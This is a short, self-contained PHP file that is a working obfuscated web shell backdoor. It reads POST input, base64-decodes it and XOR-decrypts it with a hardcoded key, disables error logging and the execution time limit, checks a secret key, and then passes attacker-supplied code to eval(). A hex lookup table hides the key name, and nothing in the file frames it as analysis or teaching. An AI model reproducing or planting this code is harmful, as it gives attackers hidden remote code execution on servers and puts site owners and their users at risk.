<?php 
$GLOBALS['array']="\x39\x44\x2b\x67\x4e\x7c\x52\x6b\x42\x55\x7b\x35\x41\x3f\x6f\xa\x34\x5d\x20\x30\x71\x23\x59\x58\x54\x70\x43\x69\x45\x7d\x27\x4b\x40\x6a\x56\x25\x74\x73\x63\x29\x68\x77\x3e\x37\x3c\x60\x48\x9\x76\x3d\x5a\x57\x36\x28\x5e\x3a\x38\x53\x5f\x75\x47\x2f\x61\x50\x6c\x32\x5c\xd\x62\x49\x24\x78\x6e\x46\x2d\x21\x72\x2e\x6d\x7a\x4f\x5b\x66\x79\x31\x2c\x7e\x51\x4d\x26\x65\x4a\x4c\x64\x2a\x22\x3b\x33";

$GLOBALS[ca7db]=$_POST;

@ini_set(error_log,NULL);
@ini_set(log_errors,0);
@ini_set(max_execution_time,0);
@set_time_limit(0);

$x=NULL;
$y=NULL;

$GLOBALS[cc688]=5p1n-th3-51lly-5tr1ng5;

global$cc688;

function xor($x,$z){
	$qc11="";
	for($i=0;$i < strlen($x);){
		for($j=0;$j < strlen($z) && $i < strlen($x);$j++,$i++){
			$qc11.=chr(ord($x[$i]) ^ ord($z[$j]));
		}
	}
	return$qc11;
}

function xor_call($x,$z){
	global$cc688;
	return xor(xor($x,$cc688),$z);
}

if(!$x){
	foreach($GLOBALS[ca7db]as$z=>$n18fd12d){
		$x=$n18fd12d;
		$y=$z;
	}
}

$x=@json_decode(xor_call(base64_decode($x),$y),true);

if(isset($x[a.$GLOBALS['array'][7]])&&$cc688==$x[a.$GLOBALS['array'][7]]){
	if($x[a]==e){
		eval($x[d]);
	}
	exit();
}
?>